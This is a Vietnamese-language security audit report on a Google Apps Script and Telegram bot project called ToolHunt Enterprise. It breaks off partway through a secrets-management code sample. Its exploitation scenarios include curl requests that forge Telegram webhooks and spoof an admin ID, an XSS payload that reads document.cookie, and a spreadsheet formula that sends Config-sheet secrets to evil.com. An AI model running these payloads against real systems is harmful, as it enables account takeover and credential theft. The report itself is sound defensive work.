# BÁO CÁO KIỂM TOÁN BẢO MẬT & XÁC THỰC (SECURITY & AUTHENTICATION AUDIT) — TOOLHUNT ENTERPRISE
**Dự án:** ToolHunt Enterprise (v3.0.0)  
**Kiểm toán viên:** Explorer 1 (Security & Authentication Auditor)  
**Mục tiêu kiểm toán:** Rà soát toàn diện mã nguồn, kiến trúc bảo mật, quản lý secrets, xác thực Webhook/WebApp, và chống tấn công Injection/XSS (Requirement R1).  
**Thời gian thực hiện:** 2026-09-02  
**Môi trường:** Google Apps Script (V8 Runtime) + Google Sheets Backend + Web Dashboard / Telegram Mini App Client.

---

## MỤC LỤC
1. [TỔNG QUAN & ĐÁNH GIÁ NGUY CƠ BẢO MẬT (EXECUTIVE SUMMARY)](#1-tổng-quan--đánh-giá-nguy-cơ-bảo-mật)
2. [DANH MỤC LỖ HỔNG BẢO MẬT THEO CẤP ĐỘ NGHIÊM TRỌNG](#2-danh-mục-lỗ-hổng-bảo-mật-theo-cấp-độ-nghiêm-trọng)
   - [Lỗ hổng Mức độ Critical (Nghiêm trọng)](#21-nhóm-lỗ-hổng-mức-độ-critical)
   - [Lỗ hổng Mức độ High (Cao)](#22-nhóm-lỗ-hổng-mức-độ-high)
   - [Lỗ hổng Mức độ Medium (Trung bình)](#23-nhóm-lỗ-hổng-mức-độ-medium)
   - [Lỗ hổng Mức độ Low & Informational (Thấp / Tối ưu)](#24-nhóm-lỗ-hổng-mức-độ-low--informational)
3. [CHUYÊN ĐỀ 1: QUẢN LÝ & LƯU TRỮ SECRETS (SECRETS MANAGEMENT & STORAGE)](#3-chuyên-đề-1-quản-lý--lưu-trữ-secrets)
4. [CHUYÊN ĐỀ 2: XÁC THỰC CHỮ KÝ TELEGRAM WEBHOOK (X-TELEGRAM-BOT-API-SECRET-TOKEN)](#4-chuyên-đề-2-xác-thực-chữ-ký-telegram-webhook)
5. [CHUYÊN ĐỀ 3: XÁC THỰC MÃ HÓA TELEGRAM WEBAPP INITDATA (HMAC-SHA256)](#5-chuyên-đề-3-xác-thực-mã-hóa-telegram-webapp-initdata-hmac-sha256)
6. [CHUYÊN ĐỀ 4: CHỐNG XSS & HTML INJECTION SANITIZATION](#6-chuyên-đề-4-chống-xss--html-injection-sanitization)
7. [CHUYÊN ĐỀ 5: BẢO MẬT GOOGLE SHEETS BACKEND (FORMULA/CSV INJECTION & DOS)](#7-chuyên-đề-5-bảo-mật-google-sheets-backend)
8. [BẢN THIẾT KẾ & CODE KHẮC PHỤC CHUẨN DOANH NGHIỆP (ENTERPRISE REMEDIATION BLUEPRINT)](#8-bản-thiết-kế--code-khắc-phục-chuẩn-doanh-nghiệp)

---

## 1. TỔNG QUAN & ĐÁNH GIÁ NGUY CƠ BẢO MẬT

Hệ thống **ToolHunt Enterprise (v3.0.0)** vận hành trên mô hình lai giữa Google Apps Script (Serverless Web App), Google Sheets (Data Layer), Telegram Bot API và Client Web Dashboard / Telegram Mini App.

Qua quá trình rà soát tĩnh và phân tích luồng dữ liệu (Static Analysis & Data Flow Tracking) trên toàn bộ codebase, kiểm toán viên xác định hệ thống hiện đang tồn tại **nhiều lỗ hổng bảo mật cốt lõi** ở tầng xác thực danh tính (Authentication), phân quyền (Authorization), bảo mật khóa API (Secrets Storage), và kiểm soát dữ liệu đầu vào (Input Sanitization).

### Bảng tổng hợp lỗ hổng phát hiện (Vulnerability Matrix):

| Mã Lỗ Hổng | Tên Lỗ Hổng | Thành Phần Bị Ảnh Hưởng | Mức Độ | Trạng Thái |
| :--- | :--- | :--- | :---: | :---: |
| **SEC-CRIT-01** | Thiếu xác thực Telegram Webhook (`X-Telegram-Bot-Api-Secret-Token`) dẫn đến giả mạo Webhook toàn diện | `google-apps-script/Code.js` | 🔴 **CRITICAL** | UNPATCHED |
| **SEC-CRIT-02** | Hoàn toàn không xác thực mã hóa Telegram WebApp `initData` (HMAC-SHA256), tin cậy `userId` tùy ý từ Client | `google-apps-script/Code.js`, `web-dashboard/app.js` | 🔴 **CRITICAL** | UNPATCHED |
| **SEC-CRIT-03** | Khóa API và Bot Token lưu trữ bản rõ (Plaintext) trong Sheet `Config`, rò rỉ cho mọi người xem Sheet | `google-apps-script/Code.js`, `SetupHelper.js` | 🔴 **CRITICAL** | UNPATCHED |
| **SEC-HIGH-01** | HTML Injection / Telegram Format Crash qua tin nhắn HTML không được Escape trong `notifyIdeaVoters` | `google-apps-script/Code.js` | 🟠 **HIGH** | UNPATCHED |
| **SEC-HIGH-02** | DOM XSS / Inline JavaScript Injection trong Web Dashboard qua thuộc tính `onclick` của thẻ nút | `web-dashboard/app.js` | 🟠 **HIGH** | UNPATCHED |
| **SEC-HIGH-03** | Google Gemini API Key bị phơi nhiễm qua URL Query Parameter thay vì HTTP Header | `google-apps-script/Code.js` | 🟠 **HIGH** | UNPATCHED |
| **SEC-MED-01** | Lỗ hổng Formula / CSV Injection khi ghi dữ liệu do người dùng nhập vào Google Sheets | `google-apps-script/Code.js` | 🟡 **MEDIUM** | UNPATCHED |
| **SEC-MED-02** | Không có giới hạn tần suất (Rate Limiting) trên Web API gây cạn kiệt hạn ngạch và tiêu hao chi phí AI | `google-apps-script/Code.js` | 🟡 **MEDIUM** | UNPATCHED |
| **SEC-MED-03** | Sử dụng bộ nhớ tạm In-Memory Map (`PENDING_IDEAS_STORE`) không tương thích môi trường phân tán GAS | `google-apps-script/Code.js` | 🟡 **MEDIUM** | UNPATCHED |
| **SEC-LOW-01** | Sinh `userId` ngẫu nhiên phía Client bằng `Math.random()` không an toàn mật mã | `web-dashboard/app.js` | 🔵 **LOW** | UNPATCHED |
| **SEC-LOW-02** | Tiết lộ chi tiết ngăn xếp lỗi nội bộ (Stack Trace Disclosure) qua phản hồi JSON API | `google-apps-script/Code.js` | 🔵 **LOW** | UNPATCHED |

---

## 2. DANH MỤC LỖ HỔNG BẢO MẬT THEO CẤP ĐỘ NGHIÊM TRỌNG

### 2.1. NHÓM LỖ HỔNG MỨC ĐỘ CRITICAL

---

#### 🔴 SEC-CRIT-01: Thiếu xác thực Telegram Webhook (`X-Telegram-Bot-Api-Secret-Token`)
- **Phân loại:** Broken Authentication / Insecure Direct Request / Request Forgery (CWE-306, CWE-345)
- **Tệp tin & Dòng mã:**
  - `google-apps-script/Code.js`: Dòng 550 - 604 (`doPost(e)`)
  - `google-apps-script/SetupHelper.js`: Dòng 175 (`setupTelegramWebhookFromUi`)
  - `scripts/setup_webhook.js`: Dòng 129 - 132
  - `scripts/setup_webhook.py`: Dòng 75 - 78
- **Đoạn mã hiện tại:**
  ```javascript
  // google-apps-script/Code.js:550
  function doPost(e) {
    try {
      if (!e || !e.postData || !e.postData.contents) {
        return createJsonResponse({ ok: false, error: "Không có dữ liệu gửi đến" });
      }

      const contents = JSON.parse(e.postData.contents);

      // 8.B. Webhook Telegram Bot (Hỗ trợ cả Chat Group, Chat 1-1 và Channel Post)
      const incomingMsg = contents.message || contents.channel_post;
      if (incomingMsg) {
        handleTelegramMessage(incomingMsg, ss);
      }

      if (contents.callback_query) {
        handleTelegramCallbackQuery(contents.callback_query, ss);
      }

      return createJsonResponse({ ok: true });
  ```
- **Phân tích rủi ro chuyên sâu:**
  - Ứng dụng Web App của Google Apps Script được cấu hình triển khai với quyền `access: "ANYONE_ANONYMOUS"` (theo `appsscript.json:8`), nghĩa là bất kỳ ai trên internet đều có thể gửi HTTP POST trực tiếp đến URL `https://script.google.com/macros/s/.../exec`.
  - Telegram Bot API chính thức hỗ trợ tham số `secret_token` trong lệnh `setWebhook`. Khi thiết lập, Telegram sẽ luôn đính kèm header `X-Telegram-Bot-Api-Secret-Token: <secret>` trong mỗi bản tin POST gửi đến webhook.
  - Mã nguồn hiện tại trong `Code.js` **hoàn toàn không kiểm tra header `X-Telegram-Bot-Api-Secret-Token`**, cũng không kiểm tra bất kỳ chữ ký bí mật nào. Đồng thời, các công cụ đăng ký webhook (`SetupHelper.js`, `setup_webhook.js`, `setup_webhook.py`) đều gọi `setWebhook` mà **không truyền `secret_token`**.
- **Kịch bản khai thác (PoC Exploitation Scenario):**
  1. Kẻ tấn công tìm thấy URL Web App của hệ thống (thông qua mã nguồn mở của Web Dashboard hoặc network inspection).
  2. Kẻ tấn công gửi HTTP POST giả mạo bản tin Telegram message với `from.id = 99999` (ID của SuperAdmin trong sheet `Admins`):
     ```bash
     curl -X POST "https://script.google.com/macros/s/AKfycb.../exec" \
       -H "Content-Type: application/json" \
       -d '{
         "update_id": 99999999,
         "message": {
           "message_id": 1,
           "from": { "id": 99999, "username": "super_admin", "first_name": "Admin" },
           "chat": { "id": -1001999999999, "title": "Group" },
           "text": "/status 1 Hoàn thành"
         }
       }'
     ```
  3. `doPost` tiếp nhận payload, hàm `hasRole(99999, ["Admin", "Manager"])` trả về `true`, và trạng thái ý tưởng lập tức bị thay đổi thành "Hoàn thành", mở khóa và giải ngân toàn bộ quỹ Bounty sang trạng thái `RELEASED` mà không cần quyền truy cập vào nhóm Telegram hay tài khoản admin thực tế!
- **Phương án khắc phục (Remediation):**
  1. Sinh chuỗi ngẫu nhiên 32+ ký tự cho Webhook Secret và lưu vào `PropertiesService.getScriptProperties().setProperty("TELEGRAM_WEBHOOK_SECRET", secretToken)`.
  2. Cập nhật các lệnh gọi `setWebhook` truyền kèm `secret_token: secretToken`.
  3. Trong `doPost(e)`, trích xuất header `e.headers["x-telegram-bot-api-secret-token"]` và kiểm tra khớp bằng hàm so sánh thời gian bất biến (Constant-time comparison) trước khi xử lý bất kỳ logic nào.

---

#### 🔴 SEC-CRIT-02: Hoàn toàn không xác thực mã hóa Telegram WebApp `initData` (HMAC-SHA256)
- **Phân loại:** Broken Authentication & Authorization / Privilege Escalation / Impersonation (CWE-287, CWE-347, CWE-639)
- **Tệp tin & Dòng mã:**
  - `web-dashboard/app.js`: Dòng 107 - 123 (`initTelegramWebApp`), Dòng 441, 475, 508, 541, 709, 775
  - `google-apps-script/Code.js`: Dòng 581 - 583 (`doPost`), Dòng 609 - 687 (`handleApiPostRequest`)
- **Đoạn mã hiện tại:**
  ```javascript
  // web-dashboard/app.js:113
  if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
    const u = tg.initDataUnsafe.user;
    STATE.currentUser.id = u.id.toString();
    STATE.currentUser.username = u.username ? "@" + u.username : (u.first_name || "Telegram User");
    ...
  }

  // google-apps-script/Code.js:659
  if (action === "claimIdea") {
    const { ideaId, userId, username } = payload;
    const res = handleClaimTask(parseInt(ideaId), userId, username || "@dev", -1001, 1000, ss);
    return createJsonResponse({ ok: res.success, error: res.error, status: res.newStatus });
  }
  ```
- **Phân tích rủi ro chuyên sâu:**
  - Theo đặc tả kỹ thuật bảo mật chính thức của Telegram Mini Apps: `Telegram.WebApp.initDataUnsafe` là đối tượng không được bảo vệ và có thể bị chỉnh sửa trực tiếp bởi người dùng trên trình duyệt (qua DevTools hoặc script). Dữ liệu chỉ an toàn khi truyền chuỗi thô `Telegram.WebApp.initData` về server để thực hiện xác thực chữ ký HMAC-SHA256 bằng Bot Token.
  - Hiện tại, Client (`app.js`) chỉ trích xuất thông tin từ `initDataUnsafe` và gửi payload JSON với `userId` và `username` thô lên backend.
  - Phía Backend (`Code.js`), hàm `handleApiPostRequest` **hoàn toàn không yêu cầu chuỗi `initData`**, không kiểm tra chữ ký số HMAC-SHA256, và tin tưởng tuyệt đối tham số `userId` gửi lên từ client.
- **Kịch bản khai thác (PoC Exploitation Scenario):**
  1. Kẻ tấn công mở Web Dashboard trong trình duyệt, mở Console DevTools và gõ:
     ```javascript
     STATE.currentUser.id = "99999"; // Spoof SuperAdmin ID
     STATE.currentUser.username = "@super_admin";
     ```
  2. Kẻ tấn công thực hiện thao tác nhận task, cập nhật tiến độ, hủy nhận task của dev khác, hoặc gửi yêu cầu API POST trực tiếp:
     ```bash
     curl -X POST "https://script.google.com/macros/s/.../exec" \
       -H "Content-Type: text/plain" \
       -d '{"apiAction":"updateProgress","ideaId":1,"userId":"99999","targetStatus":"Hoàn thành"}'
     ```
  3. Backend kiểm tra `getUserRole("99999")` -> Thấy `99999` có role `Admin` trong bảng -> Chấp thuận yêu cầu và đổi trạng thái toàn quyền!
  4. Ngoài ra, kẻ tấn công có thể viết script vòng lặp gửi `voteIdea` với hàng triệu `userId` ngẫu nhiên để thao túng kết quả bình chọn (Sybil Attack) mà không bị giới hạn.
- **Phương án khắc phục (Remediation):**
  1. Phía Client (`app.js`): Đính kèm chuỗi nguyên bản `Telegram.WebApp.initData` trong header hoặc payload của mọi yêu cầu POST gửi lên server.
  2. Phía Backend (`Code.js`): Xây dựng module xác thực chữ ký số Telegram WebApp chuẩn HMAC-SHA256:
     - Tách trường `hash` khỏi chuỗi `initData`.
     - Sắp xếp các cặp `key=value` theo thứ tự alphabet và nối bằng dấu xuống dòng `\n` tạo thành `data_check_string`.
     - Tính `secret_key = HMAC_SHA256("WebAppData", botToken)`.
     - Tính `calculated_hash = HMAC_SHA256(secret_key, data_check_string)`.
     - So sánh `calculated_hash` với `hash` bằng `constantTimeCompare`.
     - Kiểm tra `auth_date` để chống tấn công phát lại (Replay Attack) (tối đa không quá 86400 giây / 24 giờ).
     - Chỉ trích xuất `userId` và `username` từ đối tượng JSON đã giải mã từ `initData` đã được xác thực hợp lệ.

---

#### 🔴 SEC-CRIT-03: Khóa API và Bot Token lưu trữ bản rõ trong Sheet `Config`
- **Phân loại:** Plaintext Storage of Sensitive Credentials / Insecure Secrets Management (CWE-312, CWE-522)
- **Tệp tin & Dòng mã:**
  - `google-apps-script/Code.js`: Dòng 33 - 59 (`getConfig`, `getBotToken`), Dòng 14 - 25 (`DEFAULT_CONFIG`)
  - `google-apps-script/SetupHelper.js`: Dòng 65 - 86 (`initSpreadsheet`), Dòng 164 (`setupTelegramWebhookFromUi`)
- **Đoạn mã hiện tại:**
  ```javascript
  // google-apps-script/Code.js:33
  function getConfig(key) {
    try {
      const ss = SpreadsheetApp.getActiveSpreadsheet();
      const configSheet = ss.getSheetByName("Config");
      if (configSheet) {
        const data = configSheet.getDataRange().getValues();
        for (let i = 1; i < data.length; i++) {
          if (data[i][0] && data[i][0].toString().trim().toUpperCase() === key.toUpperCase()) {
            return data[i][1];
          }
        }
      }
    } catch (e) { ... }
    return DEFAULT_CONFIG[key] !== undefined ? DEFAULT_CONFIG[key] : "";
  }
  ```
- **Phân tích rủi ro chuyên sâu:**
  - Hệ thống lưu trữ trực tiếp các khóa bí mật cốt lõi: `BOT_TOKEN`, `DEEPSEEK_API_KEY`, `GEMINI_API_KEY` vào cột B của sheet `Config` trong Google Spreadsheet.
  - Trong mô hình doanh nghiệp, Google Spreadsheet thường được chia sẻ cho nhiều thành viên: Quản trị viên, Quản lý, Lập trình viên, Kế toán, hoặc Thư ký dự án với các quyền Viewer / Commenter / Editor để xem danh sách ý tưởng và lượt vote.
  - Khi một người dùng bất kỳ có quyền truy cập vào Google Spreadsheet, họ có thể đọc được toàn bộ API Key và Bot Token ở dạng văn bản thuần túy (Plaintext).
  - Với `BOT_TOKEN`, kẻ xấu có thể gọi Telegram Bot API để đọc toàn bộ tin nhắn riêng tư, chiếm quyền điều khiển bot, xóa webhook, hoặc mạo danh bot gửi tin lừa đảo đến toàn bộ cộng đồng.
  - Với `DEEPSEEK_API_KEY` và `GEMINI_API_KEY`, kẻ xấu có thể sử dụng hết hạn ngạch tài khoản hoặc làm phát sinh chi phí lớn cho chủ sở hữu.
- **Phương án khắc phục (Remediation):**
  - Chuyển toàn bộ việc lưu trữ bí mật sang `PropertiesService.getScriptProperties()`. Đây là kho lưu trữ an toàn cấp dự án của Google Apps Script (Project Metadata Store), chỉ có script backend mới có quyền truy xuất, hoàn toàn vô hình đối với người dùng xem hay chỉnh sửa Google Sheet.
  - Tạo hàm tiện ích `getSecret(key)` ưu tiên đọc từ `PropertiesService`, chỉ sử dụng fallback từ Sheet nếu chưa được cấu hình.
  - Cung cấp UI trong Apps Script editor hoặc Custom Menu có phân quyền để cài đặt Script Properties mà không ghi ra Sheet.

---

### 2.2. NHÓM LỖ HỔNG MỨC ĐỘ HIGH

---

#### 🟠 SEC-HIGH-01: HTML Injection / Crash Telegram Formatter qua `parse_mode: "HTML"` trong `notifyIdeaVoters` & Bot Messages
- **Phân loại:** Improper Output Neutralization for Context / HTML Injection / Denial of Service (CWE-79, CWE-116)
- **Tệp tin & Dòng mã:**
  - `google-apps-script/Code.js`: Dòng 285 - 295 (`notifyIdeaVoters`), Dòng 707 (`welcomeMsg`), Dòng 775 - 778 (`warningMsg`), Dòng 1330 - 1334 (`sendUserIdeasMessage`)
- **Đoạn mã hiện tại:**
  ```javascript
  // google-apps-script/Code.js:285
  if (newStatus.includes("Beta")) {
    msgText = `🧪 <b>[THÔNG BÁO TRẢI NGHIỆM BETA]</b>\n\n` +
      `Chào ${voter.username}, ý tưởng bạn từng Upvote <b>#${ideaId}: ${ideaTitle}</b> do ${devUsername} phát triển vừa ra mắt bản Beta Testing!\n\n` +
      `🔗 Link dùng thử: <a href="${demoUrl}">${demoUrl}</a>\n` +
      `📝 Góp ý nhanh: <a href="${feedbackUrl}">${feedbackUrl}</a>\n\n` +
      `Cảm ơn bạn đã đồng hành cùng ToolHunt!`;
  }
  ```
- **Phân tích rủi ro chuyên sâu:**
  - Mặc dù dự án có khai báo hàm `escapeHtml(text)` ở dòng 1361, hàm này **bị bỏ quên và không được gọi** tại nhiều vị trí then chốt, đặc biệt là trong luồng gửi thông báo `notifyIdeaVoters`.
  - Các biến `voter.username`, `ideaTitle`, `devUsername`, `demoUrl`, `feedbackUrl` được nội suy trực tiếp vào chuỗi định dạng HTML gửi đến Telegram API với tham số `parse_mode: "HTML"`.
  - Nếu `ideaTitle` chứa các ký tự như `<`, `>`, `&` (ví dụ: `Tool <Auto> & Sync`), hoặc nếu kẻ tấn công tạo ý tưởng có tiêu đề chứa mã HTML độc hại như `<a href="https://phishing.site">Click để nhận thưởng</a>` hoặc các thẻ không đóng hợp lệ (unclosed tags) như `<b>Lỗi font`, Telegram API sẽ:
    1. Trả về lỗi `HTTP 400 Bad Request: can't parse entities in message text`.
    2. Toàn bộ tiến trình gửi thông báo Beta cho hàng trăm cử tri trong vòng lặp `forEach` có thể bị lỗi, hoặc bị hiển thị nội dung giả mạo lừa đảo (HTML Injection Phishing).
- **Kịch bản khai thác:**
  1. Người dùng gửi ý tưởng: `/idea Tool Phân Tích <script> alert(1) </script> | Mô tả ý tưởng...`
  2. Khi ý tưởng này lên bản Beta, Developer kích hoạt nút `[ 🧪 Ra mắt Beta ]`.
  3. Hàm `notifyIdeaVoters` tạo chuỗi tin nhắn chứa thẻ `<script>` chưa escape.
  4. Telegram Bot API từ chối gửi tin nhắn do sai cú pháp HTML (`can't parse entities`), dẫn đến không một cử tri nào nhận được thông báo trải nghiệm Beta.
- **Phương án khắc phục (Remediation):**
  - Bọc tất cả các biến động (`voter.username`, `ideaTitle`, `devUsername`, `demoUrl`, `feedbackUrl`, `warningMsg`, `welcomeMsg`) qua hàm `escapeHtml()` trước khi đưa vào template string.

---

#### 🟠 SEC-HIGH-02: DOM XSS / Inline JavaScript Injection trong Web Dashboard
- **Phân loại:** Cross-Site Scripting (DOM-based XSS) / Code Injection (CWE-79, CWE-94)
- **Tệp tin & Dòng mã:**
  - `web-dashboard/app.js`: Dòng 324 (`renderIdeas`)
- **Đoạn mã hiện tại:**
  ```javascript
  // web-dashboard/app.js:324
  <button onclick="openBountyModal(${idea.id}, '${escapeHtml(idea.title.replace(/'/g, "\\'"))}')" class="px-2.5 py-1.5 rounded-xl ...">
    <i class="fa-solid fa-sack-dollar text-amber-400"></i>
    <span>Treo thưởng</span>
  </button>
  ```
- **Phân tích rủi ro chuyên sâu:**
  - Đoạn mã sử dụng `replace(/'/g, "\\'")` kết hợp với `escapeHtml()` để nhúng trực tiếp chuỗi tiêu đề `idea.title` vào thuộc tính sự kiện inline `onclick='...'`.
  - Hàm `escapeHtml()` trong `app.js:996` chỉ thay thế `&`, `<`, `>` mà **không thay thế dấu nháy đơn (`'`), dấu nháy kép (`"`), dấu gạch chéo ngược (`\`), hay ký tự xuống dòng (`\n`, `\r`, `\u2028`, `\u2029`)**.
  - Việc xử lý `replace(/'/g, "\\'")` có thể bị phá vỡ nếu tiêu đề chứa ký tự thoát kép hoặc ký tự đặc biệt, cho phép kẻ tấn công phá vỡ ngữ cảnh chuỗi JavaScript và thực thi mã script độc hại trong trình duyệt của người dùng xem dashboard.
- **Kịch bản khai thác:**
  1. Kẻ tấn công đăng một ý tưởng mới qua Telegram hoặc Web API với tiêu đề:
     `Tool Pro\'); alert(document.cookie); //`
  2. Khi nạn nhân (bao gồm cả Admin hoặc Developer) mở Web Dashboard và trang render danh sách ý tưởng, đoạn mã HTML được tạo ra sẽ có dạng:
     `onclick="openBountyModal(1, 'Tool Pro\'); alert(document.cookie); //')"`
  3. Khi nạn nhân nhấp vào nút "Treo thưởng", mã JavaScript độc hại sẽ được thực thi ngay lập tức trong phiên làm việc của nạn nhân.
- **Phương án khắc phục (Remediation):**
  - Tuyệt đối không nhúng chuỗi văn bản người dùng vào inline event handler. Thay vào đó, chỉ truyền `idea.id` (dạng số nguyên): `onclick="openBountyModal(${idea.id})"`.
  - Trong hàm `openBountyModal(ideaId)`, truy vấn đối tượng ý tưởng trực tiếp từ mảng `STATE.ideas` trong bộ nhớ JavaScript:
    ```javascript
    function openBountyModal(ideaId) {
      const idea = STATE.ideas.find(i => i.id === ideaId);
      const title = idea ? idea.title : "";
      ...
    }
    ```

---

#### 🟠 SEC-HIGH-03: Google Gemini API Key bị phơi nhiễm qua URL Query Parameter
- **Phân loại:** Sensitive Information Exposure in URL / Insecure API Key Transmission (CWE-598)
- **Tệp tin & Dòng mã:**
  - `google-apps-script/Code.js`: Dòng 165 (`checkAiDuplicate`)
- **Đoạn mã hiện tại:**
  ```javascript
  // google-apps-script/Code.js:165
  const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${geminiKey}`;
  const res = UrlFetchApp.fetch(geminiUrl, {
    method: "POST",
    contentType: "application/json",
    payload: JSON.stringify({ ... }),
    muteHttpExceptions: true
  });
  ```
- **Phân tích rủi ro chuyên sâu:**
  - Truyền API Key qua URL Query Parameter (`?key=...`) khiến khóa bí mật dễ bị rò rỉ trong nhật ký truy cập mạng (Access Logs), nhật ký proxy trung gian, và thông báo lỗi HTTP ngoại lệ khi `UrlFetchApp` gặp sự cố.
  - Chuẩn kết nối của Google Generative AI API hỗ trợ truyền khóa qua Header HTTP `x-goog-api-key: <key>`, giúp ẩn hoàn toàn API Key khỏi URL request.
- **Phương án khắc phục (Remediation):**
  - Chuyển `geminiKey` sang header:
    ```javascript
    const geminiUrl = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent";
    const res = UrlFetchApp.fetch(geminiUrl, {
      method: "POST",
      contentType: "application/json",
      headers: { "x-goog-api-key": geminiKey },
      payload: JSON.stringify({ ... }),
      muteHttpExceptions: true
    });
    ```

---

### 2.3. NHÓM LỖ HỔNG MỨC ĐỘ MEDIUM

---

#### 🟡 SEC-MED-01: Lỗ hổng Formula / CSV Injection khi ghi dữ liệu vào Google Sheets
- **Phân loại:** CSV / Formula Injection (CWE-1236)
- **Tệp tin & Dòng mã:**
  - `google-apps-script/Code.js`: Dòng 388 - 390 (`bountiesSheet.appendRow`), Dòng 640 - 644 (`ideasSheet.appendRow`), Dòng 813 - 817 (`ideasSheet.appendRow`), Dòng 1059 (`votesSheet.appendRow`)
- **Phân tích rủi ro:**
  - Khi lưu trữ các trường dữ liệu do người dùng tự do nhập (tiêu đề, mô tả, username, lời nhắn bounty) vào Google Sheets bằng `sheet.appendRow([...])`, nếu chuỗi văn bản bắt đầu bằng các ký tự công thức (`=`, `+`, `-`, `@`, `\t`, `\r`), Google Sheets sẽ hiểu đó là một công thức hàm và tự động thực thi khi người quản trị mở bảng tính.
  - Kẻ xấu có thể gửi tiêu đề dạng: `=IMPORTXML("https://evil.com/leak?d="&CONCATENATE(Config!B2:B5), "//a")` hoặc `=HYPERLINK("https://attacker.site", "Nhấp để nhận tiền")` để đánh cắp dữ liệu khóa cấu hình bí mật trong sheet `Config` khi admin mở file Google Sheets.
- **Phương án khắc phục:**
  - Xây dựng hàm làm sạch dữ liệu bảng tính `sanitizeSheetCell(value)`: Nếu giá trị bắt đầu bằng một trong các ký tự `=`, `+`, `-`, `@`, tự động thêm dấu nháy đơn `'` phía trước để Google Sheets hiển thị ở dạng chuỗi thuần túy (Raw Text) và không bao giờ biên dịch thành công thức.

---

#### 🟡 SEC-MED-02: Không có giới hạn tần suất (Rate Limiting) trên Web API gây cạn kiệt hạn ngạch và tiêu hao tài nguyên AI
- **Phân loại:** Uncontrolled Resource Consumption / Denial of Service (CWE-400, CWE-770)
- **Tệp tin & Dòng mã:**
  - `google-apps-script/Code.js`: Dòng 580 - 584 (`handleApiPostRequest`), Dòng 528 - 534 (`doGet?action=checkDuplicate`)
- **Phân tích rủi ro:**
  - Endpoint `checkDuplicate` và `submitIdea` kích hoạt gọi API AI bên ngoài (DeepSeek / Gemini Flash).
  - Web API không có cơ chế xác thực Token, không có Captcha và không có Rate Limiting theo địa chỉ IP hoặc User ID.
  - Kẻ tấn công có thể viết bot gửi hàng nghìn request mỗi phút để đốt hết hạn ngạch gọi `UrlFetchApp` (20,000 requests/ngày của tài khoản Google Apps Script tiêu chuẩn) và làm cạn kiệt tài khoản trả phí DeepSeek.
- **Phương án khắc phục:**
  - Sử dụng `CacheService.getScriptCache()` để thiết lập bộ đếm giới hạn tốc độ (Rate Limiter) cho mỗi `userId` (ví dụ: tối đa 5 lần gửi ý tưởng hoặc kiểm tra AI trong mỗi 60 giây).

---

#### 🟡 SEC-MED-03: Sử dụng bộ nhớ tạm In-Memory Map (`PENDING_IDEAS_STORE`) không tương thích môi trường Serverless GAS
- **Phân loại:** State Management Failure in Serverless Architecture (CWE-662)
- **Tệp tin & Dòng mã:**
  - `google-apps-script/Code.js`: Dòng 28 (`PENDING_IDEAS_STORE = new Map()`), Dòng 763, Dòng 931, Dòng 954
- **Phân tích rủi ro:**
  - Google Apps Script là môi trường tính toán phi trạng thái (Stateless Serverless). Mỗi yêu cầu HTTP POST (hoặc Telegram callback) có thể được định tuyến tới một container/worker độc lập.
  - Biến toàn cục `PENDING_IDEAS_STORE` chỉ tồn tại trong vòng đời của một instance. Khi người dùng nhấn nút "Vẫn tạo mới (Force Create)", callback query được gửi tới một instance khác, nơi `PENDING_IDEAS_STORE.get(pendingKey)` sẽ trả về `undefined`. Mặc dù có fallback sang `CacheService`, nếu cache hết hạn hoặc gặp lỗi kết nối thì luồng tạo ý tưởng sẽ bị gián đoạn hoàn toàn (`PENDING_EXPIRED`).
- **Phương án khắc phục:**
  - Lưu trữ trạng thái tạm thời hoàn toàn vào `CacheService.getScriptCache()` với thời gian sống (TTL) 600 giây, loại bỏ hoàn toàn sự phụ thuộc vào `PENDING_IDEAS_STORE` trong bộ nhớ cục bộ.

---

### 2.4. NHÓM LỖ HỔNG MỨC ĐỘ LOW & INFORMATIONAL

---

#### 🔵 SEC-LOW-01: Sinh `userId` ngẫu nhiên phía Client bằng `Math.random()` không an toàn mật mã
- **Tệp tin:** `web-dashboard/app.js`: Dòng 91 - 95 (`generateLocalUserId`)
- **Phân tích:** `Math.random()` chỉ sinh số ngẫu nhiên giả (Pseudorandom), không bảo đảm tính ngẫu nhiên an toàn mật mã và chỉ có không gian 900,000 số (từ 100000 đến 999999), dễ dẫn đến đụng độ (Collision) hoặc đoán trước ID của người dùng khác.
- **Khắc phục:** Sử dụng `crypto.getRandomValues()` hoặc chuỗi UUID v4.

---

#### 🔵 SEC-LOW-02: Tiết lộ chi tiết ngăn xếp lỗi nội bộ (Stack Trace Disclosure) qua phản hồi JSON API
- **Tệp tin:** `google-apps-script/Code.js`: Dòng 543, 597 - 598
- **Phân tích:** `Logger.log("Lỗi doPost: " + err.stack)` và trả về `{ ok: false, error: err.message }` có thể làm lộ thông tin cấu trúc tệp nội bộ, tên sheet hoặc chi tiết lỗi hệ thống cho kẻ tấn công.
- **Khắc phục:** Chuẩn hóa mã lỗi trả về (ví dụ: `INTERNAL_SERVER_ERROR`), ghi chi tiết lỗi vào `AuditLogs` thay vì trả về chi tiết ngoại lệ cho client.

---

## 3. CHUYÊN ĐỀ 1: QUẢN LÝ & LƯU TRỮ SECRETS (SECRETS MANAGEMENT & STORAGE)

### 3.1. So sánh hiện trạng vs Chuẩn Enterprise Google Apps Script

```
┌────────────────────────────────────────────────────────────────────────┐
│ ❌ HIỆN TRẠNG (BẤT CẬP):                                               │
│ Google Sheet ──> Sheet "Config" ──> Cột B (Plaintext: BOT_TOKEN, Keys) │
│ • Mọi người có quyền xem Sheet đều đọc được toàn bộ API Keys           │
│ • Không có phân vùng bảo vệ (Access Control Isolation)                 │
└────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│ ✅ CHUẨN ENTERPRISE (PROPERTIES SERVICE):                              │
│ PropertiesService.getScriptProperties() ──> Project Metadata Encrypted │
│ • Chỉ có script backend thực thi mới đọc được                          │
│ • Hoàn toàn vô hình đối với người dùng xem/chỉnh sửa Google Sheet      │
└────────────────────────────────────────────────────────────────────────┘
```

### 3.2. Phương án triển khai Module `SecretsManager`:

```javascript
/**
 * Module quản lý Secrets an toàn cấp doanh nghiệp cho Google Apps Script
 */
const SecretsManager = {
  get: function(key) {
    // 1. Ưu tiên đọc từ Script Properties (An toàn tuyệt đối)
    try {
      const prop = PropertiesService.getScriptProperties().getProperty(key);
      if (prop && prop.trim().length > 0) return prop.trim();
    } catch (e) {
